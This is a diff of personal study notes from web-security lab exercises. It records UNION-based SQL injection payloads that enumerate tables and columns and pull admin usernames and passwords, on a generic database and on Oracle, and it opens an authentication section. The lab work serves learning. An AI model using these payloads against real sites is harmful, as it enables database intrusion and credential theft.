@@ -45,14 +45,18 @@ Lab was done with UNION attack to receive results from the injected query.
 - table names "'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_pzlkhx'--" ---> username_hhuwil / password_nlnnrt
 - Admin credentials: "'+UNION+SELECT+username_hhuwil,+password_nlnnrt+FROM+users_pzlkhx--" --->  Lab solved, admin credentials displayed.
 - Longer process than on previous lab, but same approach but this time also had seek for tables where login credentials are stored.
+  
 <br>
 <br>
+
 ###Lab: SQL injection attack, listing the database contents on Oracle
 - Same progress as before, determining the amount of columns that contain text data. Then retriueving the list of tables in the DB. After this I had to find the table containing user credentials: USERS_EGFXXT
 - Column for pass: PASSWORD_EKUPDA. Column for usernames: USERNAME_QSEWBB.
 - payload to retrieve logins for all users, then find admin: '+UNION+SELECT+USERNAME_QSEWBB,+PASSWORD_EKUPDA+FROM+USERS_EGFXXT--
+  
 <br>
 <br>
+
 ## Topic: Authentication
 ### -Username enumeration via subtly different responses
 
